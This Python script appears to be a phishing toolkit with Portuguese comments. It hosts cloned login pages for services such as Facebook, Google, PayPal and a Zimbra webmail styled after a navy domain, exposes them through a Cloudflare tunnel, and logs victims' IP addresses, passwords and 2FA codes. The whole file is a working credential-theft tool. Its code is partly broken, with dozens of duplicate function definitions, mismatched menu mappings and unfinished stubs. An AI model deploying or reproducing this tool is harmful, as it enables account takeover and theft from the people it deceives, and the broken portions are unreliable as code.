#!/usr/bin/env python3
version = '1.0dev'

import os
import re
import signal
import time as t

#########################
## DEFAULT HOST ##
#########################
HOST = '127.0.0.1'
PORTA = 8080
BASE_DIR= os.popen('pwd').read()
NULL = '> /dev/null 2>&1'

#########################################
## FUNÇÃO PARA INTERRUPÇÃO DO PROGRAMA ##
#########################################
def handler(signum, frame):
        global pool
        try:
            pool.terminate()
        except Exception as e:
            print('')
            pass
        except KeyboardInterrupt:
            PID = os.popen("pgrep -f 'php -S'").read()
            if PID:
                os.system(f'kill {PID}')
            print('')
            pass
        finally:
            exit(0)

signal.signal(signal.SIGINT, handler)

##############################
## CRIA O DIRETÓRIO .SERVER ##
##############################
if not os.path.exists(".server"):
    os.makedirs(".server")

##############################
## CRIA O DIRETÓRIO AUTH ##
##############################
if not os.path.exists("auth"):
    os.makedirs("auth")

##################################
## CRIA O DIRETÓRIO .SERVER/WWW ##
##################################
if os.path.exists(".server/www"):
    os.system('rm -rf .server/www && mkdir -p .server/www')
else:
    os.makedirs(".server/www")

############################################
## REMOVE O ARQUIVO DE LOG .server/.loclx ##
############################################
loclx_log_path = ".server/.loclx"
if os.path.exists(loclx_log_path):
    os.remove(loclx_log_path)

##############################################
## REMOVE O ARQUIVO DE LOG .server/.cld.log ##
##############################################
cld_log_path = ".server/.cld.log"
if os.path.exists(cld_log_path):
    os.remove(cld_log_path)

####################################
## FINALIZAR PROCESSOS ANTERIORES ##
####################################
PID=['php','cloudflared','loclx']
for process in PID:
    try:
        # Obtém os PIDs do processo usando o comando pidof
        pids = os.popen(f"pidof {process}").read().strip().split()
        for pid in pids:
            ##############################
            ## VERIFICA SE TEM CONTEÚDO ##
            ##############################
            if pid: 
                os.kill(int(pid), 9)
    except Exception as e:
        continue

#########################################
## VERIFICA DEPENDENCIAS (PHP E UNZIP) ##
#########################################
print('Verificando dependencias:')
if os.system(f'which php {NULL}') == 0:
    print(' - PHP Instalado')
else:
    os.system('sudo apt install php')
if os.system(f'which unzip {NULL}') == 0:
    print(' - UNZIP Instalado')
else:
    os.system('sudo apt install unzip')

###################################
## VERIFICA SITUAÇAO DA INTERNET ##
###################################
if os.system(f'ping -c 1 -w 5 www.google.com {NULL}') == 0:
    print('Status da Internet: Online')
    print('Verificando Atualizações: ')
    relase_url='https://api.github.com/repos/maarckz/essex/releases/latest'
    #LOGICA
    '''
    VERIFICA A VERSAO
    SE A VERSAO FOR INFERIOR A DO GIT
    ENTAO BAIXA O TAR GZ 
    DESCOMPACTA
    E ENVIA PARA O PWD
    FAZER TRY EXCEPT PARA ERROS
    E CASO SUCESSO 
    MENSAGEM DE ATUALIZADO
    '''
else:
    print('Status da Internet: Offline')

################################
## BANNER COM O NOME E VERSÃO ##
################################
def banner():
    print(f'''\033[0;34m
888       888 888               888                  
888   o   888 888               888                  
888  d8b  888 888               888                  
888 d888b 888 88888b.   8888b.  888  .d88b.  888d888 
888d88888b888 888 "88b     "88b 888 d8P  Y8b 888P"   
88888P Y88888 888  888 .d888888 888 88888888 888     
8888P   Y8888 888  888 888  888 888 Y8b.     888     
888P     Y888 888  888 "Y888888 888  "Y8888  888 \033[m
                                             \033[7;34mv{version}\033[m''')
    

###############################
## Instalação do Cloudflared ##
###############################
def install_cloudflared():
    if os.path.exists(".server/cloudflared"):
        print("\nCloudflared está instalado.")
    else:
        print("Instalando Cloudflared...")
        arch = os.uname().machine
        url = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'  # Default URL

        if 'x86_64' in arch:
            url = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'

        os.makedirs(".server", exist_ok=True)

        command = f"wget -q -O .server/cloudflared {url}"
        result = os.system(command)
        os.system('chmod +x .server/cloudflared')
        if result == 0:
            print(f"Download do CloudFlared feito com sucesso!")
        else:
            print(f"Erro ao baixar CloudFlared!")

##################################
## FUNÇAÃO PARA ALTERAR A PORTA ##
##################################
def alterar_porta():
    try:
        sit_port = input('\nPorta padrão é \033[7;32m8080\033[m. Deseja alterar a porta? (s/N) ')
        if sit_port.lower() == 's':
            PORT = int(input('Digite a Porta: '))
            if PORT:
                return PORT
            
        elif sit_port.lower() == 'n':
            PORT = PORTA
            return PORT
        elif sit_port.lower() != 's' or 'n':
            PORT = PORTA
            return PORT
    except UnboundLocalError:
        PORT = PORTA
        return PORT
    
##################################
## CONFIGURAÇÃO DO SERVIDOR PHP ##
##################################
def config_site(SITE, HOST, PORT):
    print(f'\nConfigurando Site: \033[7;34m{SITE}\033[m')
    os.system(f'cp -rf .sites/{SITE}/* .server/www')
    os.system('cp -f .sites/ip.php .server/www/')
    os.system(f'cd .server/www && php -S "{HOST}":"{PORT}" > /dev/null 2>&1 &')


#############################
## FUNÇÃO QUE CAPTURA O IP ##
#############################
def capture_ip():
    IP = os.popen("awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs").read()
    print(f'Novo Acesso: \033[1;33m{IP}\033[m')
    print('Evento salvo em auth/ips.txt')
    os.system('cat .server/www/ip.txt >> auth/ip.txt')

####################################
## FUNÇÃO QUE CAPTURA CREDENCIAIS ##
####################################
def capture_creds():
    LOGIN = os.popen("grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}'").read()
    LOGIN = LOGIN.split('\n')
    awk = """| awk -F ":." '{print $NF}'"""
    PASSWORD= os.popen(f'''grep -o 'Pass:.*' .server/www/usernames.txt {awk}''').read()
    print(f'Login: \033[1;33m{LOGIN[0]}\033[m')
    print(f'Password: \033[1;33m{PASSWORD}\033[m')
    print('Credenciais salvas em auth/usernames.dat')
    os.system('cat .server/www/usernames.txt >> auth/usernames.dat')


############################
## FUNÇÃO QUE CAPTURA 2FA ##
############################
def capture_2fa():
    TWOFA = os.popen("cat .server/www/2fa.txt | awk '{print $2}'").read()
    print(f'2FA: \033[1;33m{TWOFA}\033[m')
    print('Credenciais salvas em auth/usernames.dat')
    os.system('cat .server/www/2fa.txt >> auth/usernames.dat')

###########################################
## IMPRIME E CAPTURA OS DADOS CAPTURADOS ##
###########################################
def capture_data():
    print("\n\033[1;30mAguardando Login, pressione Ctrl + C para sair.\033[m")

    while True:
        if os.path.exists(".server/www/ip.txt"):
            print("\nVitima Capturada!")
            capture_ip()
            os.remove(".server/www/ip.txt")
        
        t.sleep(0.75)
        
        if os.path.exists(".server/www/usernames.txt"):
            print("\n\033[mLogin Capturado!\033[m")
            capture_creds()
            os.remove(".server/www/usernames.txt")
        
        t.sleep(0.75)

        if os.path.exists(".server/www/2fa.txt"):
            print("\n\033[m2FA Capturado!\033[m")
            capture_2fa()
            os.remove(".server/www/2fa.txt")
        
        t.sleep(0.75)

####################################
## INICIA O SERVIDOR EM LOCALHOST ##
####################################
def start_localhost(SITE):
    os.system('clear')
    banner()
    PORT = alterar_porta()
    config_site(SITE,HOST,PORT)
    t.sleep(1)
    print(f"\nServidor iniciado em \033[7;32mhttp://{HOST}:{PORT} \033[m")
    capture_data()

######################################
## INICIA O SERVIDOR EM CLOUDFLARED ##
######################################
def start_cloudflared(SITE):
    os.system('clear')
    banner()
    # Remove o arquivo de log, se existir
    if os.path.exists('.cld.log'):
        os.remove('.cld.log')

    PORT = alterar_porta()
    config_site(SITE,HOST,PORT)

    print("\nIniciando Cloudflared...")

    cmd = (f"./.server/cloudflared tunnel -url {HOST}:{PORT} --logfile .server/.cld.log")
    os.system(f'{cmd} > /dev/null 2>&1 &')
    t.sleep(8)

    # Lê o arquivo de log e extrai a URL
    cldflr_url = ''
    with open('.server/.cld.log', 'r') as file:
        log_content = file.read()
        match = re.search(r'https://[-0-9a-z]*\.trycloudflare.com', log_content)
        if match:
            cldflr_url = match.group(0)
            
    print(f'Servidor Cloudflared iniciado em \033[7;32m{cldflr_url}\033[m')
    capture_data()


###################################################
## DEFINE O TIPO DE TUNELAMENTO PARA O LOCALHOST ##
###################################################
def tunnel_menu(SITE):
    print("""
 \033[0;34m[1]\033[m Localhost
 \033[0;34m[2]\033[m Cloudflared
    """)
    reply = input("Selecione a Servidor: ")

    if reply in ('1'):
        start_localhost(SITE)
    elif reply in ('2'):
        start_cloudflared(SITE)
    else:
        print("\nOpção invalida.")
        t.sleep(1)
        tunnel_menu(SITE)

######################
## PAGINA DO ZIMBRA ##
######################
def zimbra():
    os.system('clear')
    banner()
    print("""
Pagina Selecionada: Zimbra Webmail
         
 \033[0;34m[1]\033[m Página de Login
 [2] Em breve
    """)

    choice = input("\nSelecione a opção: ")

    if choice in ["1"]:
        website="zimbra"
        mask='https://webmail.marinha.mil.br'
        tunnel_menu(website)
    elif choice in ["2"]:
        website = "zimbra"
        mask = 'https://vote-for-the-best-social-media'
        tunnel_menu(website)
    else:
        print("\n[!] Invalid Option, Try Again...")
        import time
        time.sleep(1)
        menu()

def facebook():#1
    website="facebook"
    tunnel_menu(website)
def instagram():#2
    website="instagram"
    tunnel_menu(website)
def google():#3
    website="google"
    tunnel_menu(website)
def microsoft():#4
    website="microsoft"
    tunnel_menu(website)
def netflix():#5
    website="netflix"
    tunnel_menu(website)
def paypal():#6
    website="paypal"
    tunnel_menu(website)
def steam():#7
    website="steam"
    tunnel_menu(website)
def twitter():#8
    website="twitter"
    tunnel_menu(website)
    ####################################3
def facebook():#
    website="facebook"
    tunnel_menu(website)
def facebook():#
    website="facebook"
    tunnel_menu(website)
def facebook():#
    website="facebook"
    tunnel_menu(website)
def facebook():#
    website="facebook"
    tunnel_menu(website)
def facebook():#
    website="facebook"
    tunnel_menu(website)
def facebook():#
    website="facebook"
    tunnel_menu(website)
def facebook():#
    website="facebook"
    tunnel_menu(website)
def facebook():#
    website="facebook"
    tunnel_menu(website)
def facebook():#
    website="facebook"
    tunnel_menu(website)
def facebook():#
    website="facebook"
    tunnel_menu(website)
def facebook():#18
    website="facebook"
    tunnel_menu(website)
def facebook():#19
    website="facebook"
    tunnel_menu(website)
def facebook():#20
    website="facebook"
    tunnel_menu(website)
def facebook():#21
    website="facebook"
    tunnel_menu(website)
def facebook():#22
    website="facebook"
    tunnel_menu(website)
def facebook():#23
    website="facebook"
    tunnel_menu(website)
def facebook():#24
    website="facebook"
    tunnel_menu(website)
def facebook():#25
    website="facebook"
    tunnel_menu(website)
def facebook():#26
    website="facebook"
    tunnel_menu(website)
def facebook():#27
    website="facebook"
    tunnel_menu(website)
def facebook():#28
    website="facebook"
    tunnel_menu(website)
def facebook():#29
    website="facebook"
    tunnel_menu(website)
def facebook():#30
    website="facebook"
    tunnel_menu(website)
def facebook():#31
    website="facebook"
    tunnel_menu(website)
def facebook():#32
    website="facebook"
    tunnel_menu(website)
def facebook():#33
    website="facebook"
    tunnel_menu(website)
def facebook():#34
    website="facebook"
    tunnel_menu(website)
def github():#35
    website="github"
    tunnel_menu(website)
def zimbra():#36
    website="zimbra"
    tunnel_menu(website)
def clonesite():#00
    site = input('Digite o Site a ser clonado (www.***.***): ')
    clone = f'wget --mirror --convert-links --adjust-extension --page-requisites https://{site}'
def sobre():#99
    banner()
    print('''
          ''')

####################
## MENU PRINCIPAL ##
####################
def menu():
    try:
        os.system("clear")
        banner()
        print('''
\033[0;34m[1]\033[m - Facebook     \033[0;34m[13]\033[m - Twitch       \033[0;34m[25]\033[m - DeviantArt
\033[0;34m[2]\033[m - Instagram    \033[0;34m[14]\033[m - Pinterest    \033[0;34m[26]\033[m - Badoo
\033[0;34m[3]\033[m - Google       \033[0;34m[15]\033[m - Snapchat     \033[0;34m[27]\033[m - Origin              
\033[0;34m[4]\033[m - Microsoft    \033[0;34m[16]\033[m - Linkedin     \033[0;34m[28]\033[m - DropBox
\033[0;34m[5]\033[m - Netflix      \033[0;34m[17]\033[m - Ebay         \033[0;34m[29]\033[m - Yahoo
\033[0;34m[6]\033[m - Paypal       \033[0;34m[18]\033[m - Quora        \033[0;34m[30]\033[m - Wordpress
\033[0;34m[7]\033[m - Steam        \033[0;34m[19]\033[m - Protonmail   \033[0;34m[31]\033[m - Yandex              
\033[0;34m[8]\033[m - Twitter      \033[0;34m[20]\033[m - Spotify      \033[0;34m[32]\033[m - StackoverFlow
\033[0;34m[9]\033[m - Playstation  \033[0;34m[21]\033[m - Reddit       \033[0;34m[33]\033[m - Vk
\033[0;34m[10]\033[m- Tiktok       \033[0;34m[22]\033[m - Adobe        \033[0;34m[34]\033[m - XBOX
\033[0;34m[11]\033[m- Mediafire    \033[0;34m[23]\033[m - Gitlab       \033[0;34m[35]\033[m - Github
\033[0;34m[12]\033[m- Discord      \033[0;34m[24]\033[m - Roblox       \033[0;34m[36]\033[m - Zimbra

\033[0;34m[00]\033[m - CloneSite    \033[0;34m[99]\033[m - Sobre
        ''')

        options = {
        1: facebook,
        2: instagram,
        3: google,
        4: microsoft,
        5: netflix,
        6: paypal,
        7: steam,
        8: twitter,
        #9: playstation,
        #10: tiktok,
        #11: mediafire,
        #12: discord,
        #13: twitch,
        #14: pinterest,
        #15: snapchat,
        #16: linkedin,
        #17: ebay,
        #18: quora,
        #19: protonmail,
        #20: spotify,
        #21: reddit,
        #22: adobe,
        #23: gitlab,
        #24: roblox,
        25: zimbra,
        26: zimbra,
        27: zimbra,
        28: zimbra,
        29: zimbra,
        30: zimbra,
        31: zimbra,
        32: zimbra,
        33: zimbra,
        34: zimbra,
        35: github,
        36: zimbra,
        00: clonesite,
        99: sobre,
        
        0: lambda: print('Volte sempre!') or quit
        }

        opcao = int(input('Escolha uma opção: '))
        funcao = options.get(opcao)

        if funcao:
            funcao()

        elif opcao > 24:
            print('Digite uma opção válida!')
            input("Pressione Enter para continuar...")

    except ValueError:
        print('Digite uma opção válida!')



####    ##########    ####
####    ## MAIN ##    ####
####    ##########    ####
if __name__ == "__main__":
    install_cloudflared()
    menu()